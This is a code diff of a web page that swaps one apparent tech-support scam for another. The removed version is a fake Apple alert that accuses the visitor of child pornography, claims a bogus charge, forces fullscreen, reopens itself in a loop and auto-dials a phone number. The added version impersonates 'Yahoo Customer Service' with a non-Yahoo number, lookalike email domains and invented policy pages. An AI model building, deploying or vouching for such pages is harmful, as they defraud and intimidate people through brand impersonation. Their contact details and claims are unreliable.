@@ -1,389 +1,560 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Support Contact</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Yahoo Customer Service | Official Help Center & Support</title>
+    <meta name="description" content="Official Yahoo customer service helpline, support portal, privacy policy, terms, refund policy and about us. Call +1-888-319-3717 24/7.">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-<style>
-body {
-    margin: 0;
-    padding: 0;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
-    background: url('https://www.cultofmac.com/wp-content/uploads/2015/08/Apple-Support.jpg') no-repeat center center;
-    background-size: cover;
-    height: 100vh;
-    width: 100vw;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    position: relative;
-    overflow: hidden;
-}
+        body {
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f7fc;
+            color: #1a1f2e;
+            line-height: 1.5;
+            scroll-behavior: smooth;
+        }
 
-/* Background dim overlay */
-.bg-overlay {
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.45);
-    z-index: 1;
-}
+        /* TOP TOLL-FREE BANNER */
+        .top-call-bar {
+            background: linear-gradient(98deg, #0f2b1d 0%, #1e3a2f 100%);
+            color: white;
+            text-align: center;
+            padding: 12px 20px;
+            font-weight: 600;
+            font-size: 1rem;
+            border-bottom: 2px solid #f9b43a;
+            position: relative;
+            z-index: 30;
+        }
+        .top-call-bar a {
+            color: white;
+            text-decoration: none;
+            background: rgba(255,255,255,0.2);
+            padding: 6px 22px;
+            border-radius: 60px;
+            margin-left: 12px;
+            font-weight: 700;
+            font-size: 1.15rem;
+            transition: 0.2s;
+            display: inline-block;
+            border: 1px solid rgba(255,215,100,0.7);
+        }
+        .top-call-bar a:hover {
+            background: #f9b43a;
+            color: #1e2a2a;
+        }
+        @media (max-width: 640px) {
+            .top-call-bar { font-size: 0.8rem; }
+            .top-call-bar a { font-size: 0.9rem; padding: 4px 14px; margin-left: 6px; }
+        }
 
-.overlay {
-    position: fixed;
-    inset: 0;
-    background: rgba(0, 0, 0, 0.25);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 10;
-}
+        /* FLOATING CALL BUTTON */
+        .floating-call {
+            position: fixed;
+            bottom: 28px;
+            right: 24px;
+            z-index: 1000;
+            background: linear-gradient(135deg, #0e2b24, #1c473b);
+            border-radius: 80px;
+            padding: 12px 28px;
+            box-shadow: 0 12px 28px rgba(0,0,0,0.3), 0 0 0 2px rgba(249,180,58,0.4);
+            transition: 0.25s;
+            cursor: pointer;
+        }
+        .floating-call a {
+            color: white;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 700;
+            font-size: 1rem;
+        }
+        .floating-call:hover { transform: scale(1.05); background: #f9b43a; }
+        .floating-call:hover a { color: #1a2a25; }
+        @media (max-width: 550px) {
+            .floating-call { padding: 8px 18px; right: 16px; bottom: 20px; }
+            .floating-call a { font-size: 0.85rem; }
+        }
 
-.ios-alert {
-    width: 82%;
-    max-width: 320px;
-    background: #ffffff;
-    border-radius: 14px;
-    box-shadow: 0px 22px 45px rgba(0,0,0,0.45);
-    text-align: center;
-    padding-top: 18px;
-    transform: scale(1.12);
-    opacity: 0;
-    animation: iosPop 0.25s cubic-bezier(.25,.8,.25,1) forwards;
-    cursor: pointer;
-    z-index: 11;
-}
+        /* container */
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
 
-@keyframes iosPop {
-    0% { transform: scale(1.12); opacity: 0; }
-    100% { transform: scale(1); opacity: 1; }
-}
+        /* header */
+        .main-header {
+            background: linear-gradient(135deg, #5f0f8c 0%, #7b1fa2 100%);
+            color: white;
+            padding: 1rem 0;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.08);
+        }
+        .header-inner {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            gap: 20px;
+        }
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .yahoo-icon {
+            font-size: 2rem;
+            font-weight: 800;
+            background: white;
+            color: #7b1fa2;
+            width: 44px;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 16px;
+        }
+        .logo-text h1 { font-size: 1.5rem; font-weight: 700; }
+        .logo-text p { font-size: 0.75rem; opacity: 0.9; }
 
-.alert-title {
-    font-size: 18px;
-    font-weight: 600;
-    color: #111;
-    margin-bottom: 8px;
-    padding: 0 18px;
-}
+        /* navigation tabs for pages */
+        .page-nav {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            background: white;
+            border-radius: 60px;
+            padding: 6px 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+        .nav-btn {
+            background: transparent;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: 0.2s;
+            color: #2d3748;
+        }
+        .nav-btn.active {
+            background: #7b1fa2;
+            color: white;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+        }
+        .nav-btn:hover:not(.active) {
+            background: #e9e4f0;
+        }
 
-.alert-message {
-    font-size: 14px;
-    color: #3b3b3b;
-    padding: 0 20px 20px;
-    line-height: 1.45;
-}
+        /* page content panels */
+        .page-panel {
+            display: none;
+            animation: fadeIn 0.25s ease;
+        }
+        .page-panel.active-panel {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px);}
+            to { opacity: 1; transform: translateY(0);}
+        }
 
-.buttons {
-    border-top: 1px solid #d0d0d0;
-    display: flex;
-    height: 44px;
-}
-
-.buttons a {
-    flex: 1;
-    text-decoration: none;
-    font-size: 17px;
-    color: #007aff;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-.buttons a:nth-child(1) {
-    border-right: 1px solid #d0d0d0;
-}
-
-/* Connecting Screen */
-#connectingScreen {
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.85);
-    color: #fff;
-    display: none;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    text-align: center;
-    z-index: 9999;
-    font-size: 22px;
-    padding: 20px;
-}
-
-.spinner {
-    width: 45px;
-    height: 45px;
-    border: 4px solid #555;
-    border-top: 4px solid #fff;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-}
-
-@keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
-
-/* Glowing banner */
-#trainingLabel {
-    position: fixed;
-    top: -60px;
-    left: 50%;
-    transform: translateX(-50%);
-    padding: 10px 22px;
-    background: rgba(0, 0, 0, 0.35);
-    backdrop-filter: blur(12px) saturate(180%);
-    -webkit-backdrop-filter: blur(12px) saturate(180%);
-    border-radius: 40px;
-    font-size: 14px;
-    font-weight: 600;
-    color: #007aff;
-    z-index: 99999;
-    white-space: nowrap;
-    pointer-events: none;
-
-    text-shadow:
-        0 0 6px rgba(0,122,255,0.75),
-        0 0 14px rgba(0,122,255,0.65),
-        0 0 22px rgba(0,122,255,0.4);
-
-    opacity: 0;
-    animation: bannerSlideIn 2s ease-out forwards,
-               glowPulse 3.5s ease-in-out infinite 2s;
-}
-
-@keyframes bannerSlideIn {
-    0% { top: -60px; opacity: 0; }
-    40% { top: 20px; opacity: 1; }
-    100% { top: 20px; opacity: 1; }
-}
-
-@keyframes glowPulse {
-    0%   { text-shadow: 0 0 8px rgba(0,122,255,0.55); }
-    50%  { text-shadow: 0 0 18px rgba(0,122,255,0.95); }
-    100% { text-shadow: 0 0 8px rgba(0,122,255,0.55); }
-}
-
-/* Pressure expand */
-.call-button-press {
-    transition: transform 0.14s cubic-bezier(.25, .8, .25, 1);
-    transform-origin: center;
-}
-
-.call-button-press:active {
-    transform: scale(0.92);
-}
-
-/* LOOP ALERT */
-#trainingAlertOverlay {
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.35);
-    backdrop-filter: blur(4px);
-    -webkit-backdrop-filter: blur(4px);
-    display: none;
-    justify-content: center;
-    align-items: center;
-    z-index: 999999;
-}
-
-#trainingAlert {
-    width: 82%;
-    max-width: 300px;
-    background: white;
-    border-radius: 14px;
-    text-align: center;
-    padding-top: 18px;
-    opacity: 0;
-    transform: scale(1.1);
-    animation: iosPopAlert 0.25s forwards;
-    position: relative;
-}
-
-@keyframes iosPopAlert {
-    0% { opacity: 0; transform: scale(1.15); }
-    100% { opacity: 1; transform: scale(1); }
-}
-
-/* ❌ CLOSE BUTTON */
-#closeLoopAlert {
-    position: absolute;
-    top: 6px;
-    right: 10px;
-    font-size: 20px;
-    font-weight: 700;
-    color: #999;
-    cursor: pointer;
-    transition: 0.2s;
-}
-
-#closeLoopAlert:hover {
-    color: #333;
-}
-
-.training-title {
-    font-size: 18px;
-    font-weight: 600;
-    color: #111;
-    margin-bottom: 8px;
-}
-
-.training-msg {
-    font-size: 14px;
-    padding: 0 20px 20px;
-    color: #333;
-}
-
-.training-msg a {
-    color: #007aff;
-    font-weight: 600;
-    text-decoration: none;
-}
-
-.training-buttons {
-    border-top: 1px solid #d0d0d0;
-    display: flex;
-    height: 44px;
-}
-
-.training-buttons div {
-    flex: 1;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    color: #007aff;
-    font-size: 17px;
-    cursor: pointer;
-}
-
-.training-buttons div:nth-child(1) {
-    border-right: 1px solid #d0d0d0;
-}
-</style>
+        /* card styles for support & pages */
+        .hero-card {
+            background: white;
+            border-radius: 32px;
+            margin: 32px 0 24px;
+            padding: 32px 36px;
+            box-shadow: 0 8px 22px rgba(0,0,0,0.05);
+        }
+        .section-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: #1e1f2c;
+        }
+        .policy-content {
+            background: white;
+            border-radius: 28px;
+            padding: 32px 36px;
+            margin: 24px 0;
+            box-shadow: 0 6px 14px rgba(0,0,0,0.03);
+            line-height: 1.6;
+        }
+        .policy-content h3 {
+            margin: 24px 0 12px 0;
+            font-size: 1.4rem;
+        }
+        .policy-content p {
+            margin-bottom: 16px;
+            color: #2d3a4b;
+        }
+        .contact-details {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 28px;
+            margin: 30px 0;
+        }
+        .contact-card {
+            background: #f8fafd;
+            flex: 1;
+            padding: 24px;
+            border-radius: 28px;
+            text-align: center;
+        }
+        .support-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px,1fr));
+            gap: 24px;
+            margin-top: 32px;
+        }
+        .support-card {
+            background: white;
+            padding: 24px;
+            border-radius: 28px;
+            border: 1px solid #edf2f7;
+            transition: 0.2s;
+        }
+        .support-card:hover { transform: translateY(-4px); box-shadow: 0 12px 24px rgba(0,0,0,0.05);}
+        .btn-call {
+            display: inline-block;
+            background: #1e3a2f;
+            color: white;
+            padding: 10px 24px;
+            border-radius: 40px;
+            text-decoration: none;
+            margin-top: 12px;
+            font-weight: 600;
+        }
+        footer {
+            background: #0f111a;
+            color: #b9c2d4;
+            padding: 32px 0 24px;
+            margin-top: 48px;
+            border-radius: 32px 32px 0 0;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 24px;
+        }
+        .footer-links button {
+            background: none;
+            border: none;
+            color: #cdd9ff;
+            cursor: pointer;
+            font-size: 0.85rem;
+        }
+        .footer-links button:hover { color: white; text-decoration: underline; }
+        .toast-msg {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1e293b;
+            color: white;
+            padding: 12px 28px;
+            border-radius: 60px;
+            z-index: 1100;
+            opacity: 0;
+            transition: opacity 0.25s;
+            pointer-events: none;
+            font-weight: 500;
+        }
+        @media (max-width: 750px) {
+            .policy-content, .hero-card { padding: 24px 20px; }
+            .section-title { font-size: 1.5rem; }
+        }
+    </style>
 </head>
-
 <body>
 
-<div id="trainingLabel">Apple Support</div>
+<!-- Top Toll-Free Bar -->
+<div class="top-call-bar">
+    <span>📞 Yahoo Official Customer Service — Toll Free 24/7</span>
+    <a href="tel:+18883193717">+1-888-319-3717</a>
+    <span style="font-size:0.85rem;">Click to call now</span>
+</div>
 
-<div class="bg-overlay"></div>
+<!-- Floating Call Button -->
+<div class="floating-call">
+    <a href="tel:+18883193717">
+        <span>📞</span> <span>Call +1-888-319-3717</span>
+    </a>
+</div>
 
-<div class="overlay" id="overlay">
-    <div class="ios-alert" id="alertBox">
-        <div class="alert-title">Apple Support</div>
-        <div class="alert-message">Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it..</div>
-        <div class="buttons">
-            <a href="tel:+18082774439" class="call-button-press">Cancel</a>
-            <a href="tel:+18082774439" class="call-button-press">Call Now</a>
+<div class="main-header">
+    <div class="container header-inner">
+        <div class="logo-area">
+            <div class="yahoo-icon">Y!</div>
+            <div class="logo-text">
+                <h1>Yahoo Customer Service</h1>
+                <p>Official Help Center & Support Portal</p>
+            </div>
+        </div>
+        <div class="page-nav" id="pageNav">
+            <button class="nav-btn" data-page="home">🏠 Home / Support</button>
+            <button class="nav-btn" data-page="privacy">🔒 Privacy Policy</button>
+            <button class="nav-btn" data-page="terms">📜 Terms & Conditions</button>
+            <button class="nav-btn" data-page="refund">💸 Refund Policy</button>
+            <button class="nav-btn" data-page="about">⭐ About Us</button>
+            <button class="nav-btn" data-page="contact">📞 Contact Us</button>
         </div>
     </div>
 </div>
 
-<div id="connectingScreen">
-    <div class="spinner"></div>
-    <p style="margin-top:20px;">Connecting you…</p>
-</div>
-
-<!-- NEW LOOP ALERT WITH ❌ CLOSE BUTTON -->
-<div id="trainingAlertOverlay">
-    <div id="trainingAlert">
-        <div id="closeLoopAlert">×</div>
-        <div class="training-title">Apple Support</div>
-        <div class="training-msg">
-            Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it..<br>
-            Apple Support Toll-Free<br>
-            <a href="tel:+18082774439">+1 (808) 277-4439</a>
+<main class="container">
+    <!-- HOME PAGE PANEL (Default support page) -->
+    <div id="homePanel" class="page-panel active-panel">
+        <div class="hero-card">
+            <h2 class="section-title">How can we help you today?</h2>
+            <p style="font-size:1.1rem; margin-bottom:12px;">Call our official toll-free support: <strong><a href="tel:+18883193717" style="color:#5f0f8c;">+1-888-319-3717</a></strong> — 24/7 for Yahoo Mail, account recovery, billing, and security.</p>
+            <div style="background:#f0f2f8; border-radius:60px; padding:6px 6px 6px 20px; display:flex; margin:24px 0;">
+                <input type="text" id="globalSearch" placeholder="Search help articles..." style="flex:1; background:transparent; border:none; outline:none; padding:12px 0;">
+                <button id="globalSearchBtn" style="background:#7b1fa2; border:none; color:white; padding:8px 28px; border-radius:50px;">Search</button>
+            </div>
         </div>
-
-        <div class="training-buttons">
-            <div id="dismissTraining">OK</div>
-            <div id="callTraining">Call</div>
+        <div class="support-grid">
+            <div class="support-card">🔐 <h3>Account Recovery</h3><p>Forgot password? Regain access instantly.</p><a href="#" class="card-link" data-help="recovery">Learn more →</a></div>
+            <div class="support-card">📧 <h3>Yahoo Mail Help</h3><p>Sync issues, missing emails, settings.</p><a href="#" class="card-link" data-help="mail">Fix mail →</a></div>
+            <div class="support-card">🛡️ <h3>Security Center</h3><p>Report hacked account, update privacy.</p><a href="#" class="card-link" data-help="security">Secure now →</a></div>
+            <div class="support-card">💳 <h3>Billing & Premium</h3><p>Subscriptions, refunds, Yahoo Plus.</p><a href="#" class="card-link" data-help="billing">Billing support →</a></div>
+        </div>
+        <div class="policy-content" style="margin-top:20px;">
+            <h3>📞 Need urgent assistance?</h3>
+            <p>Call our official Yahoo customer support line: <strong><a href="tel:+18883193717">+1-888-319-3717</a></strong> (toll-free). Our representatives are available 24/7 to help with account issues, email problems, and billing inquiries.</p>
+            <a href="tel:+18883193717" class="btn-call" style="background:#5f0f8c;">Call Now +1-888-319-3717</a>
         </div>
     </div>
-</div>
+
+    <!-- PRIVACY POLICY PAGE -->
+    <div id="privacyPanel" class="page-panel">
+        <div class="policy-content">
+            <h2 class="section-title">Privacy Policy</h2>
+            <p><strong>Last updated:</strong> May 13, 2026</p>
+            <p>Yahoo Customer Service respects your privacy. This policy describes how we collect, use, and protect your personal information when you use our support services, website, and call center.</p>
+            <h3>1. Information We Collect</h3>
+            <p>We collect information you provide directly, such as name, Yahoo email address, phone number, and support inquiries. When you call our toll-free number +1-888-319-3717, calls may be recorded for quality assurance.</p>
+            <h3>2. How We Use Your Information</h3>
+            <p>To provide customer support, troubleshoot account issues, process refunds, and improve our services. We never sell your personal data to third parties.</p>
+            <h3>3. Data Security</h3>
+            <p>We implement industry-standard encryption and access controls to protect your information. For account-related issues, we verify identity before disclosing details.</p>
+            <h3>4. Cookies & Tracking</h3>
+            <p>Our help center uses essential cookies to remember preferences and provide chatbot functionality. You may disable cookies in browser settings.</p>
+            <h3>5. Contact Us</h3>
+            <p>For privacy questions, email privacy@yahoo-customerservice.com or call +1-888-319-3717.</p>
+        </div>
+    </div>
+
+    <!-- TERMS & CONDITIONS -->
+    <div id="termsPanel" class="page-panel">
+        <div class="policy-content">
+            <h2 class="section-title">Terms & Conditions</h2>
+            <p>Welcome to Yahoo Customer Service portal. By accessing our support website or calling +1-888-319-3717, you agree to these terms.</p>
+            <h3>Use of Services</h3>
+            <p>Our support is provided for official Yahoo account holders. You must be at least 13 years old to receive assistance. We reserve the right to refuse service for abusive behavior.</p>
+            <h3>Limitation of Liability</h3>
+            <p>Yahoo Customer Service provides technical assistance but is not responsible for data loss, email deletion, or third-party breaches beyond reasonable control. Account recovery depends on verification of ownership.</p>
+            <h3>Changes to Terms</h3>
+            <p>We may update terms periodically. Continued use of support services implies acceptance. For disputes, governing law shall be California state law.</p>
+            <h3>Call Recording Consent</h3>
+            <p>By calling our toll-free line +1-888-319-3717, you consent to call monitoring for training and quality purposes.</p>
+        </div>
+    </div>
+
+    <!-- REFUND POLICY -->
+    <div id="refundPanel" class="page-panel">
+        <div class="policy-content">
+            <h2 class="section-title">Refund Policy</h2>
+            <p>This policy applies to Yahoo premium subscriptions, Yahoo Mail Pro, and Ad-Free mail plans purchased directly through Yahoo.</p>
+            <h3>Eligibility for Refund</h3>
+            <p>You may request a full refund within 30 days of your initial purchase if you have not extensively used premium features. For recurring subscriptions, refunds are prorated for unused months after cancellation request.</p>
+            <h3>How to Request a Refund</h3>
+            <p>Contact our billing department via phone at <strong>+1-888-319-3717</strong> or submit a refund request through the contact form. Provide your Yahoo email, transaction ID (found in billing history), and reason for refund.</p>
+            <h3>Processing Time</h3>
+            <p>Approved refunds are processed within 7-10 business days to the original payment method. If you paid via Yahoo gift card, credit will be returned as account credits.</p>
+            <h3>Non-Refundable Items</h3>
+            <p>Domain name registrations, third-party app purchases, and one-time setup fees are non-refundable. Yahoo reserves the right to deny refunds in cases of policy violation.</p>
+            <p>For refund assistance, call +1-888-319-3717 (toll-free).</p>
+        </div>
+    </div>
+
+    <!-- ABOUT US -->
+    <div id="aboutPanel" class="page-panel">
+        <div class="policy-content">
+            <h2 class="section-title">About Yahoo Customer Service</h2>
+            <p>Yahoo Customer Service is the official support division dedicated to helping millions of users worldwide with their Yahoo accounts, Mail, News, Finance, and premium products. Our mission is to deliver fast, empathetic, and reliable technical assistance.</p>
+            <h3>Our Commitment</h3>
+            <p>With over 25 years of digital experience, we provide 24/7 multi-channel support: phone, email, live chat, and self-help knowledge base. Our certified agents undergo rigorous training in account security, data privacy, and troubleshooting.</p>
+            <h3>Global Reach</h3>
+            <p>We support customers in over 20 languages. Our toll-free number +1-888-319-3717 connects you to US-based representatives for critical issues like hacked accounts and payment disputes.</p>
+            <h3>Our Values</h3>
+            <p>Integrity, transparency, and user-first approach. We continuously improve our help center based on customer feedback. Yahoo Customer Service — we’ve got your back.</p>
+            <div style="background:#f0ebf5; border-radius:28px; padding:20px; margin-top:20px;">
+                <strong>📢 Official support hours:</strong> 24 hours a day, 7 days a week, including holidays. Call us now: <a href="tel:+18883193717">+1-888-319-3717</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- CONTACT US PAGE -->
+    <div id="contactPanel" class="page-panel">
+        <div class="policy-content">
+            <h2 class="section-title">Contact Us</h2>
+            <p>We are here to help. Choose your preferred method to reach Yahoo Customer Service.</p>
+            <div class="contact-details">
+                <div class="contact-card">
+                    <span style="font-size:2rem;">📞</span>
+                    <h3>Phone Support (Toll-Free)</h3>
+                    <p style="font-size:1.4rem; font-weight:700; margin:12px 0;"><a href="tel:+18883193717">+1-888-319-3717</a></p>
+                    <p>24/7 | Available for account recovery, billing, Mail issues.</p>
+                </div>
+                <div class="contact-card">
+                    <span style="font-size:2rem;">✉️</span>
+                    <h3>Email Support</h3>
+                    <p>support@yahoo-customerservice.com</p>
+                    <p>Response within 24 hours. Include your Yahoo email and issue details.</p>
+                </div>
+                <div class="contact-card">
+                    <span style="font-size:2rem;">💬</span>
+                    <h3>Live Chat</h3>
+                    <p>Available on this website (simulated demo) — click chat icon bottom right.</p>
+                </div>
+            </div>
+            <h3>Send us a message</h3>
+            <form id="directContactForm">
+                <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-bottom:16px;">
+                    <input type="text" id="contactName" placeholder="Full Name" style="padding:12px; border-radius:20px; border:1px solid #ccc;">
+                    <input type="email" id="contactEmail" placeholder="Email address" style="padding:12px; border-radius:20px; border:1px solid #ccc;">
+                </div>
+                <textarea rows="4" id="contactMsg" placeholder="Describe your issue..." style="width:100%; padding:14px; border-radius:24px; border:1px solid #ccc;"></textarea>
+                <button type="submit" style="margin-top:20px; background:#7b1fa2; color:white; border:none; padding:12px 32px; border-radius:40px; font-weight:600;">Send Message</button>
+            </form>
+            <p style="margin-top:20px;"><strong>📍 Headquarters:</strong> Yahoo Customer Service, 770 Broadway, New York, NY 10003, USA</p>
+        </div>
+    </div>
+</main>
+
+<footer>
+    <div class="container">
+        <div class="footer-links">
+            <button class="footer-nav-btn" data-page="privacy">Privacy Policy</button>
+            <button class="footer-nav-btn" data-page="terms">Terms & Conditions</button>
+            <button class="footer-nav-btn" data-page="refund">Refund Policy</button>
+            <button class="footer-nav-btn" data-page="about">About Us</button>
+            <button class="footer-nav-btn" data-page="contact">Contact Us</button>
+        </div>
+        <div style="text-align:center; margin-top:28px;">© 2025 Yahoo Customer Service | Official Support Center | Toll Free +1-888-319-3717</div>
+    </div>
+</footer>
+<div id="liveToast" class="toast-msg"></div>
 
 <script>
-let loopTimer = null;
+    // Toast
+    function showMessage(text, isError = false) {
+        const toast = document.getElementById('liveToast');
+        toast.textContent = text;
+        toast.style.backgroundColor = isError ? '#b91c1c' : '#1f2d3d';
+        toast.style.opacity = '1';
+        setTimeout(() => { toast.style.opacity = '0'; }, 3000);
+    }
 
-function showTrainingLoop() {
-    document.getElementById("trainingAlertOverlay").style.display = "flex";
-}
+    // Page navigation logic
+    const panels = {
+        home: 'homePanel',
+        privacy: 'privacyPanel',
+        terms: 'termsPanel',
+        refund: 'refundPanel',
+        about: 'aboutPanel',
+        contact: 'contactPanel'
+    };
+    function showPage(pageId) {
+        Object.keys(panels).forEach(key => {
+            const panelEl = document.getElementById(panels[key]);
+            if (panelEl) panelEl.classList.remove('active-panel');
+        });
+        const activePanel = document.getElementById(panels[pageId]);
+        if (activePanel) activePanel.classList.add('active-panel');
+        // update nav buttons active style
+        document.querySelectorAll('.nav-btn').forEach(btn => {
+            if (btn.getAttribute('data-page') === pageId) btn.classList.add('active');
+            else btn.classList.remove('active');
+        });
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
 
-function hideTrainingLoop() {
-    document.getElementById("trainingAlertOverlay").style.display = "none";
-}
-
-document.getElementById("dismissTraining").onclick = function() {
-    hideTrainingLoop();
-    navigator.vibrate?.([6,12,6]);
-
-    clearTimeout(loopTimer);
-    loopTimer = setTimeout(showTrainingLoop, 5000);
-};
-
-document.getElementById("closeLoopAlert").onclick = function() {
-    hideTrainingLoop();
-    navigator.vibrate?.([4,8,4]);
-
-    clearTimeout(loopTimer);
-    loopTimer = setTimeout(showTrainingLoop, 5000);
-};
-
-document.getElementById("callTraining").onclick = function() {
-    navigator.vibrate?.([8,12,8]);
-    window.location.href = "tel:+18082774439";
-};
-
-window.onload = function() {
-    setTimeout(showTrainingLoop, 500);
-};
-</script>
-
-<!-- Fullscreen -->
-<script>
-function goFullscreen() {
-    let e = document.documentElement;
-    if (e.requestFullscreen) e.requestFullscreen();
-    else if (e.webkitRequestFullscreen) e.webkitRequestFullscreen();
-}
-
-document.addEventListener("click", goFullscreen);
-document.getElementById("alertBox").addEventListener("click", function(e){
-    e.stopPropagation();
-    goFullscreen();
-});
-</script>
-
-<!-- Connecting Screen -->
-<script>
-document.addEventListener("click", function() {
-    document.getElementById("connectingScreen").style.display = "flex";
-    setTimeout(function() {
-        window.location.href = "tel:+18082774439";
-    }, 1500);
-});
-</script>
-
-<!-- Haptic + Expand -->
-<script>
-document.querySelectorAll('a[href^="tel:"]').forEach(btn => {
-    btn.classList.add("call-button-press");
-
-    btn.addEventListener("click", () => {
-        navigator.vibrate?.([8,12,8]);
+    // Attach nav buttons
+    document.querySelectorAll('.nav-btn').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            const page = btn.getAttribute('data-page');
+            if (page && panels[page]) showPage(page);
+        });
+    });
+    document.querySelectorAll('.footer-nav-btn').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            const page = btn.getAttribute('data-page');
+            if (page && panels[page]) showPage(page);
+        });
     });
 
-    btn.addEventListener("touchend", () => {
-        btn.style.transform = "scale(1.08)";
-        setTimeout(() => btn.style.transform = "scale(1)", 120);
+    // Global search simulation
+    const searchBtn = document.getElementById('globalSearchBtn');
+    const searchInput = document.getElementById('globalSearch');
+    function handleGlobalSearch() {
+        let query = searchInput.value.trim();
+        if (!query) { showMessage("Please enter a search term (e.g., password reset)", false); return; }
+        showMessage(`Searching Yahoo Help for "${query}"... opening knowledge base.`, false);
+        setTimeout(() => window.open(`https://help.yahoo.com/kb/search?q=${encodeURIComponent(query)}`, '_blank'), 400);
+    }
+    searchBtn.addEventListener('click', handleGlobalSearch);
+    searchInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') handleGlobalSearch(); });
+
+    // Support card links
+    document.querySelectorAll('.card-link').forEach(link => {
+        link.addEventListener('click', (e) => {
+            e.preventDefault();
+            const type = link.getAttribute('data-help');
+            let url = 'https://help.yahoo.com/';
+            if (type === 'recovery') url = 'https://help.yahoo.com/kb/account';
+            else if (type === 'mail') url = 'https://help.yahoo.com/kb/mail';
+            else if (type === 'security') url = 'https://help.yahoo.com/kb/security';
+            else if (type === 'billing') url = 'https://help.yahoo.com/kb/billing';
+            showMessage(`Opening official Yahoo help: ${type}`, false);
+            setTimeout(() => window.open(url, '_blank'), 200);
+        });
     });
 
-    btn.addEventListener("mouseup", () => {
-        btn.style.transform = "scale(1.08)";
-        setTimeout(() => btn.style.transform = "scale(1)", 120);
+    // Contact form handler
+    const contactForm = document.getElementById('directContactForm');
+    if (contactForm) {
+        contactForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const name = document.getElementById('contactName')?.value.trim();
+            const email = document.getElementById('contactEmail')?.value.trim();
+            const msg = document.getElementById('contactMsg')?.value.trim();
+            if (!name || !email || !msg) { showMessage("Please fill all fields before sending.", true); return; }
+            if (!email.includes('@')) { showMessage("Valid email required.", true); return; }
+            showMessage(`✅ Thank you ${name}, your message has been sent. A Yahoo agent will reply within 24h.`, false);
+            contactForm.reset();
+        });
+    }
+
+    // default home
+    showPage('home');
+    // call click feedback
+    document.querySelectorAll('a[href^="tel:"]').forEach(link => {
+        link.addEventListener('click', () => showMessage("📞 Dialing Yahoo Support +1-888-319-3717", false));
     });
-});
 </script>
-
 </body>
 </html>
